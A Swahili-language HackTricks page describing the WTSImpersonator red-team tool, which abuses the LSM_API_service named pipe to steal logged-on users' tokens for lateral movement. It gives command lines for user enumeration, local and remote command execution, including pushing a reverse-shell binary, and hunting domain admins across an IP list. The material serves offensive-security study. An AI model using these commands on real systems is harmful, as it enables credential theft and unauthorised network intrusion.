<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Zana ya **WTS Impersonator** inatumia bomba la jina la RPC la **"\\pipe\LSM_API_service"** kwa siri kuchunguza watumiaji walioingia na kuiba alama zao, ikipita njia za kawaida za udanganyifu wa Alama. Njia hii inawezesha harakati za upande kwa upande ndani ya mitandao. Ubunifu nyuma ya mbinu hii unatolewa kwa **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Uwezo Muhimu
Zana hufanya kazi kupitia mfululizo wa wito wa API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli muhimu na Matumizi
- **Kutambua Watumiaji**: Kutambua watumiaji wa ndani na wa mbali kunawezekana na zana hii, kwa kutumia amri kwa hali yoyote:
- Kwa ndani:
```powershell
.\WTSImpersonator.exe -m enum
```
- Kwa mbali, kwa kutoa anwani ya IP au jina la mwenyeji:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Kutekeleza Amri**: Moduli za `exec` na `exec-remote` zinahitaji muktadha wa **Huduma** ili kufanya kazi. Utekelezaji wa ndani unahitaji tu faili ya WTSImpersonator na amri:
- Mfano wa utekelezaji wa amri ya ndani:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe inaweza kutumika kupata muktadha wa huduma:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Utekelezaji wa Amri kwa Mbali**: Inahusisha kuunda na kusakinisha huduma kwa mbali kama PsExec.exe, kuruhusu utekelezaji na ruhusa sahihi.
- Mfano wa utekelezaji wa mbali:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduli ya Kumtafuta Mtumiaji**: Inalenga watumiaji maalum kwenye mashine nyingi, ikitekeleza nambari chini ya uadilifu wao. Hii ni muhimu hasa kwa kulenga Waendeshaji wa Kikoa wenye haki za usimamizi wa ndani kwenye mifumo kadhaa.
- Mfano wa matumizi:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
